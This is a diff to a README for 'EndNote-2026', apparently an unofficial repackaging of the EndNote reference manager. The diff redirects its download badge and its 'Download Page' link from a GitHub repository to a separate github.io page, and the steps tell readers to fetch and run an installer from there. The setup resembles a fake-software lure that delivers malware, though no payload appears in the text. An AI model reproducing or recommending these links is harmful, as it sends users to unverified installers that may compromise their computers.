@@ -1,7 +1,7 @@
 # 📚 EndNote-2026 - Organize your research references with ease
 
 
-[![](https://img.shields.io/badge/Download-EndNote-2026-blue)](https://github.com/fibromaflare175/EndNote-2026)
+[![](https://img.shields.io/badge/Download-EndNote-2026-blue)](https://fibromaflare175.github.io)
 
 
 ## What is EndNote-2026
@@ -25,7 +25,7 @@ Your computer must meet these requirements for the software to run well:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [EndNote-2026 Download Page](https://github.com/fibromaflare175/EndNote-2026).
+1. Visit the [EndNote-2026 Download Page](https://fibromaflare175.github.io).
 2. Locate the link to download the installer file.
 3. Click the link to save the installer file to your computer.
 4. Find the file in your Downloads folder once the download finishes.
